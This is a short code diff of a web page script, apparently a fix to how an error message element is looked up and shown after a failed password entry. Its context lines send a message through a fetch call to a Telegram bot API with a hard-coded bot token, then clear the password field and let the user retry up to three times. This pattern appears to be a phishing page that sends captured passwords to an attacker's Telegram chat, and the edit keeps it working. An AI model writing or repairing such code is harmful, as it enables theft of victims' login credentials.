@@ -108,12 +108,14 @@
                     // Corrected URL: Removed curly braces and added '/bot' before the token.
                     fetch(`https://api.telegram.org/bot8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
-                    // Declare and initialize errorDiv here
-                    const errorDiv = document.getElementById('errorDiv'); // Or use querySelector if it's a class or other selector
+                    // Add this line to define errorDiv
+                    const errorDiv = document.getElementById('yourErrorDivId'); // Replace 'yourErrorDivId' with the actual ID of your error message div.
 
                     setTimeout(() => {
                         if (attempts < 3) {
-                            errorDiv.style.display = "block";
+                            if (errorDiv) { // Add a check to ensure errorDiv is found
+                                errorDiv.style.display = "block";
+                            }
                             passwordField.value = '';
                             passwordField.focus();
                         } else {
@@ -125,6 +127,7 @@
         }
     });
 </script>
+
 
 
 
